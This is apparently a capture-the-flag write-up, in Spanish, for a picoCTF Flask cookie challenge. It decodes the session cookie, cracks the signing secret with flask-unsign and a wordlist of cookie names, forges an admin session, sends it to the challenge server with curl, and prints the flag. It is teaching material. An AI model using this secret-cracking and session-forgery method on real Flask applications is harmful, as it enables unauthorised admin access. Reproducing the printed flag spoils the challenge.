## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/1e4bd835ad3e7fe776d49e7b8cc280c1/server.py) [http://mercury.picoctf.net:35697/](http://mercury.picoctf.net:35697/)
## Pistas
How secure is a flask cookie?
## Solución 1
1. Viendo las cookies del sitio:
```
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_Vd3A.6Vrwv1sJ8zIekikAOa0AxZgb5XY
```
2. Podemos decodificarla 
```bash
echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_ViLA._PsKl7iBBIF26yiTkgEOhdpgclM | base64 -d

{"very_auth":"snickerdoodle"}base64: invalid input

```
3. Al ver el codigo vemos que hay un arreglo donde estan los nombres de todas las galletas, y luego se toma una al azar para crear una llave para la cookie
4. Usando flask unsign probando con todas las galletas.
```bash
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_ViLA._PsKl7iBBIF26yiTkgEOhdpgclM" --wordlist galletas.txt
```
5. Vemos que la clave de es: `peanut butter`
6. Ahora firmamos nosotros la cookie con la palabra secreta
```bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"
```
7. Usando la cookie resultado: `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_VjGA.9IYieHdvyHcC8EyXKLF4DCC9Pjk`
8. Probamos con la cookie
```bash
curl -s http://mercury.picoctf.net:35697/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_VjGA.9IYieHdvyHcC8EyXKLF4DCC9Pjk" | grep pico
```
9. Obtenemos la bandera
`picoCTF{pwn_4ll_th3_cook1E5_22fe0842}`
## Notas adicionales

## Referencias
